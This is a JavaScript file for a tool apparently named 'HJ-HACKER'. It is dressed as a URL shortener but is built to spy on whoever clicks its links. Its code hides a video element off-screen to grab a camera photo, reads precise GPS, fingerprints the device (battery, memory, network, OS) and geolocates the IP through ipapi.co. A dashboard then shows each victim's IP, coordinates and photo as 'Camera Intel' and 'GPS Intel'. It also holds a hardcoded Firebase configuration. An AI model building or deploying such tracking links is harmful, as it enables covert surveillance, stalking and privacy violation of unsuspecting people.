// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// ========== FIXED: COMPLETE DEVICE INFORMATION COLLECTION ==========
async function getAdvancedDeviceInfo() {
    const info = {
        // Basic device info
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || 'en-US',
        languages: navigator.languages ? navigator.languages.join(',') : 'en-US',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
        timezone_offset: new Date().getTimezoneOffset(),
        
        // Screen info - FIXED
        screen_width: screen.width || window.innerWidth,
        screen_height: screen.height || window.innerHeight,
        screen_color_depth: screen.colorDepth || 24,
        screen_pixel_ratio: window.devicePixelRatio || 1,
        
        // Browser info
        cookies_enabled: navigator.cookieEnabled,
        do_not_track: navigator.doNotTrack || 'unspecified',
        hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
        max_touch_points: navigator.maxTouchPoints || 0,
        
        // Network info
        connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
        rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
        
        // Device memory
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
        
        // Battery info
        battery_level: 'unknown',
        battery_charging: 'unknown',
        
        // Orientation
        orientation: screen.orientation ? screen.orientation.type : (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape'),
        
        // Touch support
        touch_support: 'ontouchstart' in window,
        java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
        window_width: window.innerWidth,
        window_height: window.innerHeight,
        
        // OS Version
        os_version: 'unknown'
    };
    
    // Get battery info
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            info.battery_level = Math.round(battery.level * 100) + '%';
            info.battery_charging = battery.charging;
        } catch(e) {
            console.log('Battery API error:', e);
        }
    }
    
    // Detect device brand/model from user agent
    const ua = navigator.userAgent;
    if (ua.includes('iPhone')) {
        info.device_model = 'iPhone';
        info.os_version = ua.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'unknown';
    } else if (ua.includes('iPad')) {
        info.device_model = 'iPad';
        info.os_version = ua.match(/iPad; CPU OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'unknown';
    } else if (ua.includes('Android')) {
        const match = ua.match(/Android[\s/]+([\d.]+)/);
        info.device_model = 'Android';
        info.android_version = match ? match[1] : 'unknown';
        info.os_version = match ? match[1] : 'unknown';
        if (ua.includes('SM-')) info.device_brand = 'Samsung';
        else if (ua.includes('MI')) info.device_brand = 'Xiaomi';
        else if (ua.includes('OnePlus')) info.device_brand = 'OnePlus';
        else if (ua.includes('Pixel')) info.device_brand = 'Google';
        else if (ua.includes('OPPO')) info.device_brand = 'OPPO';
        else if (ua.includes('vivo')) info.device_brand = 'vivo';
        else if (ua.includes('realme')) info.device_brand = 'Realme';
        else info.device_brand = 'Unknown';
    } else if (ua.includes('Windows')) {
        info.device_model = 'Windows PC';
        const winMatch = ua.match(/Windows NT ([\d.]+)/);
        info.os_version = winMatch ? winMatch[1] : 'unknown';
    } else if (ua.includes('Mac')) {
        info.device_model = 'Mac';
        const macMatch = ua.match(/Mac OS X ([\d_]+)/);
        info.os_version = macMatch ? macMatch[1].replace(/_/g, '.') : 'unknown';
    } else {
        info.device_model = 'Unknown';
    }
    
    // Get OS name
    if (ua.includes('Android')) info.os = 'Android';
    else if (ua.includes('iPhone') || ua.includes('iPad')) info.os = 'iOS';
    else if (ua.includes('Windows')) info.os = 'Windows';
    else if (ua.includes('Mac')) info.os = 'macOS';
    else if (ua.includes('Linux')) info.os = 'Linux';
    else info.os = 'Unknown';
    
    // Get Browser
    if (ua.includes('Chrome') && !ua.includes('Edg')) info.browser = 'Chrome';
    else if (ua.includes('Firefox')) info.browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) info.browser = 'Safari';
    else if (ua.includes('Edg')) info.browser = 'Edge';
    else if (ua.includes('Opera')) info.browser = 'Opera';
    else info.browser = 'Unknown';
    
    return info;
}

// ========== FIXED: CAMERA CAPTURE FUNCTION ==========
async function captureCameraPhoto() {
    return new Promise(async (resolve, reject) => {
        try {
            // Request camera permission
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // Create video element
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.style.position = 'fixed';
            video.style.top = '-9999px';
            video.style.left = '-9999px';
            document.body.appendChild(video);
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(resolve, 500);
                };
            });
            
            // Create canvas and capture photo
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to base64 (compressed)
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Clean up
            stream.getTracks().forEach(track => track.stop());
            video.remove();
            
            resolve(imageData);
        } catch (error) {
            console.error('Camera capture error:', error);
            reject(error);
        }
    });
}

// ========== FIXED: LOCATION CAPTURE FUNCTION ==========
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.log('Location error:', error);
                resolve(null);
            },
            { timeout: 10000, enableHighAccuracy: true }
        );
    });
}

// ========== FIXED: IP AND LOCATION FROM API ==========
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            country_code: data.country_code,
            postal: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone
        };
    } catch (error) {
        console.log('IP API error:', error);
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
    }
}

// Main Shorten Function
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try {
        new URL(urlToShorten);
    } catch {
        showToast('Error', 'Invalid URL', 'error');
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const exists = await checkCodeExists(shortCode);
    if (exists) {
        showToast('Error', `Code "${shortCode}" already taken`, 'error');
        return;
    }
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    if (hasPassword && !password) {
        showToast('Error', 'Please enter a password', 'error');
        return;
    }
    
    if (hasSocialGate && (!socialTitle || !socialUrl)) {
        showToast('Error', 'Please fill social gate details', 'error');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten,
            domain: domain,
            created_at: createdAt,
            device_id: deviceId,
            clicks: 0
        };
        
        if (password) linkData.password = password;
        if (socialTitle) linkData.social_gate_title = socialTitle;
        if (socialUrl) linkData.social_gate_url = socialUrl;
        if (socialIcon) linkData.social_gate_icon = socialIcon;
        if (socialDesc) linkData.social_gate_description = socialDesc;
        if (socialButton) linkData.social_gate_button_text = socialButton;
        if (animation) linkData.animation_type = animation;
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        
        const shortLinkSpan = document.getElementById('shortLink');
        const resultDiv = document.getElementById('result');
        const qrCodeDiv = document.getElementById('qrCode');
        
        if (shortLinkSpan) shortLinkSpan.textContent = shortUrl;
        if (resultDiv) resultDiv.classList.remove('hidden');
        
        if (typeof QRCode !== 'undefined' && qrCodeDiv) {
            qrCodeDiv.innerHTML = '';
            new QRCode(qrCodeDiv, {
                text: shortUrl,
                width: 100,
                height: 100,
                colorDark: "#00ff41",
                colorLight: "#000000"
            });
        }
        
        showToast('Success', 'Link created successfully!', 'success');
        
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        const passwordSection = document.getElementById('passwordSection');
        const socialSection = document.getElementById('socialSection');
        if (passwordSection) passwordSection.classList.add('hidden');
        if (socialSection) socialSection.classList.add('hidden');
        if (document.getElementById('password')) document.getElementById('password').value = '';
        
        resultDiv?.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
    } catch (error) {
        console.error('Error:', error);
        showToast('Error', error.message || 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        if (loading) loading.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        if (loading) loading.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// ========== DATA DISPLAY FUNCTIONS ==========
function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

// LINKS - Show all created links
async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading links...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        
        snapshot.forEach(child => {
            links.push({ code: child.key, ...child.val() });
        });
        
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p><small>Create your first link above</small></div>');
            return;
        }
        
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                    <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-url"><i class="fas fa-globe"></i> ${link.long_url?.substring(0, 60)}${link.long_url?.length > 60 ? '...' : ''}</div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mouse-pointer"></i> Clicks: ${link.clicks || 0}</span>
                    ${link.password ? '<span><i class="fas fa-lock"></i> Password Protected</span>' : ''}
                    ${link.social_gate_url ? '<span><i class="fas fa-share-alt"></i> Social Gate</span>' : ''}
                    ${link.capture_camera ? '<span><i class="fas fa-camera"></i> Camera Intel</span>' : ''}
                    ${link.capture_location ? '<span><i class="fas fa-map-marker-alt"></i> GPS Intel</span>' : ''}
                </div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> View Data</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch (error) {
        updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading links</p></div>');
    }
}

// STATS - Show overall statistics
async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading stats...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0, totalCamera = 0, totalLocation = 0;
        const linksList = [];
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
            linksList.push({ code, long_url: data.long_url, created_at: data.created_at });
            
            const analyticsSnapshot = await database.ref(`analytics/${code}`).get();
            analyticsSnapshot.forEach(a => {
                if (a.val().captured_image) totalCamera++;
                if (a.val().latitude) totalLocation++;
            });
        }
        
        const html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label"><i class="fas fa-link"></i> Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${totalCamera}</div><div class="stat-label"><i class="fas fa-camera"></i> Camera Intel</div></div>
                <div class="stat-card"><div class="stat-value">${totalLocation}</div><div class="stat-label"><i class="fas fa-map-marker-alt"></i> GPS Intel</div></div>
            </div>
            ${linksList.length > 0 ? `
                <div style="margin-top: 12px;">
                    <p style="font-size: 0.7rem; color: #888; margin-bottom: 8px;"><i class="fas fa-list"></i> Your Links:</p>
                    ${linksList.map(link => `
                        <div class="data-item" style="margin-bottom: 6px;">
                            <div class="data-item-header">
                                <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                                <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(link.created_at).toLocaleDateString()}</span>
                            </div>
                            <div class="data-item-stats">
                                <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> View Details</button>
                            </div>
                        </div>
                    `).join('')}
                </div>
            ` : '<div class="empty-data"><i class="fas fa-info-circle"></i><p>No links yet. Create one above!</p></div>'}
        `;
        
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch (error) {
        updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading stats</p></div>');
    }
}

// RECENT - Show recent visitors with full device info
async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading recent activity...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const allVisitors = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(30).get();
            analyticsSnapshot.forEach(analytic => {
                const data = analytic.val();
                allVisitors.push({
                    code: code,
                    ip: data.ip_address,
                    device_model: data.device_model,
                    device_brand: data.device_brand,
                    os: data.os,
                    os_version: data.os_version,
                    browser: data.browser,
                    battery: data.battery_level,
                    battery_charging: data.battery_charging,
                    memory: data.device_memory,
                    connection: data.connection_type,
                    timestamp: data.created_at,
                    camera: data.captured_image,
                    location: data.latitude,
                    city: data.city,
                    country: data.country,
                    screen_width: data.screen_width,
                    screen_height: data.screen_height,
                    language: data.language,
                    timezone: data.timezone,
                    orientation: data.orientation
                });
            });
        }
        
        allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = allVisitors.slice(0, 20);
        
        if (recent.length === 0) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity</p><small>Share your links to see visitor data</small></div>');
            return;
        }
        
        const html = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${v.code}</span>
                    <span class="data-item-date"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mobile-alt"></i> ${v.device_brand ? v.device_brand + ' ' : ''}${v.device_model || v.os || 'Unknown Device'} ${v.os_version ? `(v${v.os_version})` : ''}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> ${v.browser || 'Unknown Browser'}</span>
                    ${v.battery && v.battery !== 'unknown' ? `<span><i class="fas fa-battery-full"></i> Battery: ${v.battery} ${v.battery_charging === true ? '<i class="fas fa-bolt"></i>' : ''}</span>` : ''}
                    ${v.memory && v.memory !== 'unknown' ? `<span><i class="fas fa-microchip"></i> RAM: ${v.memory}</span>` : ''}
                    ${v.connection && v.connection !== 'unknown' ? `<span><i class="fas fa-wifi"></i> ${v.connection.toUpperCase()}</span>` : ''}
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-desktop"></i> Screen: ${v.screen_width || '?'}x${v.screen_height || '?'}</span>
                    <span><i class="fas fa-language"></i> Lang: ${v.language || 'Unknown'}</span>
                    <span><i class="fas fa-clock"></i> TZ: ${v.timezone || 'Unknown'}</span>
                </div>
                ${v.city ? `<div class="data-item-stats"><i class="fas fa-map-marker-alt"></i> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                ${v.camera ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Camera captured! <button class="data-btn-sm" onclick="viewPhoto('${v.camera}')"><i class="fas fa-eye"></i> View Photo</button></div>` : ''}
                ${v.location ? '<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-satellite-dish"></i> GPS Location Captured!</div>' : ''}
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="viewAnalytics('${v.code}')"><i class="fas fa-chart-line"></i> View Full Data</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch (error) {
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading recent data</p></div>');
    }
}

// View Photo - Opens in modal, no crash
window.viewPhoto = (imageData) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    if (modal && img && imageData && imageData !== 'black_screen') {
        img.src = imageData;
        modal.classList.remove('hidden');
    } else {
        showToast('Error', 'No valid photo available', 'error');
    }
};

function closePhotoModal() {
    const modal = document.getElementById('photoModal');
    if (modal) modal.classList.add('hidden');
}

function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src && img.src !== '') {
        const link = document.createElement('a');
        link.download = 'captured_photo_' + Date.now() + '.jpg';
        link.href = img.src;
        link.click();
        showToast('Success', 'Photo downloaded!', 'success');
    } else {
        showToast('Error', 'No photo to download', 'error');
    }
}

// View Analytics for specific link with full device info
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>');
    
    try {
        const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get();
        const analytics = [];
        snapshot.forEach(child => { analytics.push({ id: child.key, ...child.val() }); });
        analytics.reverse();
        
        const linkSnapshot = await database.ref(`urls/${code}`).get();
        const linkData = linkSnapshot.val();
        
        const totalClicks = analytics.length;
        const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
        const cameras = analytics.filter(a => a.captured_image && a.captured_image !== 'black_screen').length;
        const locations = analytics.filter(a => a.latitude).length;
        
        let html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${uniqueIPs}</div><div class="stat-label"><i class="fas fa-users"></i> Unique Visitors</div></div>
                <div class="stat-card"><div class="stat-value">${cameras}</div><div class="stat-label"><i class="fas fa-camera"></i> Camera Intel</div></div>
                <div class="stat-card"><div class="stat-value">${locations}</div><div class="stat-label"><i class="fas fa-map-marker-alt"></i> GPS Tracked</div></div>
            </div>
            <div style="margin-bottom: 12px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 8px;">
                <div style="font-size: 0.7rem;"><i class="fas fa-link"></i> ${linkData?.long_url || 'N/A'}</div>
                ${linkData?.password ? '<div style="font-size: 0.7rem;"><i class="fas fa-lock"></i> Password Protected</div>' : ''}
                ${linkData?.social_gate_url ? '<div style="font-size: 0.7rem;"><i class="fas fa-share-alt"></i> Social Gate Enabled</div>' : ''}
            </div>
        `;
        
        if (analytics.length === 0) {
            html += '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet. Share your link!</p></div>';
        } else {
            html += `<h4 style="font-size: 0.75rem; margin: 12px 0 8px;"><i class="fas fa-list-ul"></i> Complete Visitor Details (${analytics.length} records)</h4>`;
            html += analytics.map(v => `
                <div class="data-item">
                    <div class="data-item-header">
                        <span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span>
                        <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(v.created_at).toLocaleString()}</span>
                    </div>
                    <div class="data-item-stats"><strong><i class="fas fa-mobile-alt"></i> Device:</strong> ${v.device_brand ? v.device_brand + ' ' : ''}${v.device_model || v.os || 'Unknown'} ${v.os_version ? `(v${v.os_version})` : ''}</div>
                    <div class="data-item-stats"><strong><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong><i class="fab fa-${v.os?.toLowerCase() || 'windows'}"></i> OS:</strong> ${v.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-battery-full"></i> Battery:</strong> ${v.battery_level || 'Unknown'} ${v.battery_charging === true ? '<i class="fas fa-bolt"></i> (Charging)' : v.battery_charging === false ? '(Not Charging)' : ''}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-microchip"></i> RAM/Memory:</strong> ${v.device_memory || 'Unknown'} | <strong><i class="fas fa-wifi"></i> Connection:</strong> ${v.connection_type ? v.connection_type.toUpperCase() : 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-desktop"></i> Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'} | <strong><i class="fas fa-language"></i> Language:</strong> ${v.language || 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-clock"></i> Timezone:</strong> ${v.timezone || 'Unknown'} | <strong><i class="fas fa-rotate"></i> Orientation:</strong> ${v.orientation || 'Unknown'}</div>
                    ${v.city ? `<div class="data-item-stats"><strong><i class="fas fa-map-marker-alt"></i> Location:</strong> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                    ${v.latitude ? `<div class="data-item-stats"><strong><i class="fas fa-satellite-dish"></i> GPS:</strong> ${v.latitude.toFixed(4)}, ${v.longitude?.toFixed(4)}</div>` : ''}
                    ${v.captured_image && v.captured_image !== 'black_screen' ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Camera captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image}')"><i class="fas fa-eye"></i> View Photo</button></div>` : ''}
                    ${v.captured_image === 'black_screen' ? '<div class="data-item-stats" style="color: #ffaa00;"><i class="fas fa-exclamation-triangle"></i> Camera access denied or black screen</div>' : ''}
                </div>
            `).join('');
        }
        
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
        showToast('Success', `Loaded ${analytics.length} visitor records!`, 'success');
    } catch (error) {
        updateDisplay('ANALYTICS ERROR', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading analytics</p></div>');
        showToast('Error', 'Failed to load analytics', 'error');
    }
};

window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied to clipboard!', 'success');
};

// Bottom Navigation
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click any button to view data', 'fa-fingerprint', 
                '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap on LINKS, STATS, or RECENT button below</p></div>');
        } else if (tab === 'links') {
            showLinks();
        } else if (tab === 'stats') {
            showStats();
        } else if (tab === 'recent') {
            showRecent();
        }
    });
});

// Toggle handlers
const passwordToggle = document.getElementById('passwordToggle');
if (passwordToggle) {
    passwordToggle.addEventListener('change', (e) => {
        const section = document.getElementById('passwordSection');
        if (section) section.classList.toggle('hidden');
    });
}

const socialToggle = document.getElementById('socialToggle');
if (socialToggle) {
    socialToggle.addEventListener('change', (e) => {
        const section = document.getElementById('socialSection');
        if (section) section.classList.toggle('hidden');
    });
}

// Icon selector
document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        const socialIconInput = document.getElementById('socialIcon');
        if (socialIconInput) socialIconInput.value = icon.dataset.icon;
    });
});

// Advanced toggle
const advancedToggle = document.getElementById('advancedToggle');
if (advancedToggle) {
    advancedToggle.addEventListener('click', () => {
        const content = document.getElementById('advancedContent');
        const icon = document.querySelector('#advancedToggle .fa-chevron-down');
        if (content) content.classList.toggle('hidden');
        if (icon) icon.style.transform = content?.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
    });
}

// Photo modal event listeners
const closePhotoModalBtn = document.getElementById('closePhotoModal');
const closePhotoModalBtn2 = document.getElementById('closePhotoModalBtn');
const downloadPhotoBtn = document.getElementById('downloadPhotoBtn');

if (closePhotoModalBtn) closePhotoModalBtn.addEventListener('click', closePhotoModal);
if (closePhotoModalBtn2) closePhotoModalBtn2.addEventListener('click', closePhotoModal);
if (downloadPhotoBtn) downloadPhotoBtn.addEventListener('click', downloadPhoto);

// Close modal on outside click
window.addEventListener('click', (e) => {
    const modal = document.getElementById('photoModal');
    if (e.target === modal) closePhotoModal();
});

// Event listeners
const shortenBtn = document.getElementById('shortenBtn');
if (shortenBtn) shortenBtn.addEventListener('click', shortenUrl);

const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
    copyBtn.addEventListener('click', () => {
        const link = document.getElementById('shortLink')?.textContent;
        if (link) copyToClipboard(link);
    });
}

// Export functions for global use
window.getAdvancedDeviceInfo = getAdvancedDeviceInfo;
window.captureCameraPhoto = captureCameraPhoto;
window.captureLocation = captureLocation;
window.getIPInfo = getIPInfo;

console.log('🔥 HJ-HACKER Advanced Loaded with Fixed Camera & Full Device Info!');
